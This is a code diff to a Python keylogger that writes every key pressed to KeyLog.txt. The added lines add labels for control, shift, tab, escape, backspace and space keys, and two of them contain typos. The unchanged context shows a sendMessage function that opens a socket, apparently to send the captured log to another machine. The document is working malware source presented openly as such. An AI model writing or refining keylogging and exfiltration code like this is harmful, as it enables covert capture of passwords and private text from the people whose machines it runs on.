@@ -9,9 +9,20 @@ def keyPress(event):
     with open("KeyLog.txt", "a") as f:
         if event.name == "enter":
             f.write('\n----------\n (Return) \n----------\n')
+        elif event.name == "ctrl":
+            f.write('\nContorl\n')
+        elif event.name == "shfit":
+            f.write('\nShfit\n')
+        elif event.name == "tab":
+            f.write('\nTab\n')
+        elif event.name == "esc":
+            f.write('\nEscape\n')
+        elif event.name == "backspace":
+            f.write('\nBack Space\n')
+        elif event.name == "space":
+            f.write(' ')    
         else:
             f.write('{}'.format(event.name))
-
 
 def sendMessage():
     #Creating Socket
@@ -45,8 +56,6 @@ def sendMessage():
     file.close()
     s.close()
 
-# def job():
-#     print("test")
 
 def main():
 
